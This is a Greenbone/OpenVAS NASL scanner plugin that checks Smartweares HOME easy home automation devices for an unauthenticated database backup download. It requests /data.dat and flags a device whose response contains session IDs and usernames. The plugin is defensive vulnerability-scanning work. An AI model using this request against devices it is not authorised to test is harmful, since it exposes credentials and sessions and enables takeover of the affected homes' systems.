# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:smartweares:home_easy";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143112");
  script_version("2019-11-12T03:12:45+0000");
  script_tag(name:"last_modification", value:"2019-11-12 03:12:45 +0000 (Tue, 12 Nov 2019)");
  script_tag(name:"creation_date", value:"2019-11-12 02:52:52 +0000 (Tue, 12 Nov 2019)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Smartweares HOME easy Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_smartwares_home_easy_http_detect.nasl");
  script_mandatory_keys("smartweares/home_easy/detected");

  script_tag(name:"summary", value:"Smartweares HOME easy is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The home automation solution is vulnerable to unauthenticated database backup
  download and information disclosure vulnerability. This can enable the attacker to disclose sensitive and
  clear-text information resulting in authentication bypass, session hijacking and full system control.");

  script_tag(name:"solution", value:"No known solution is available as of 12th November, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5541.php");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/data.dat";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data:req);

if (res =~ "^HTTP/1\.[01] 200") {
  res = bin2string(ddata: res, noprint_replacement: "");

  if ('"sessionid"' >< res && '"username"' >< res) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
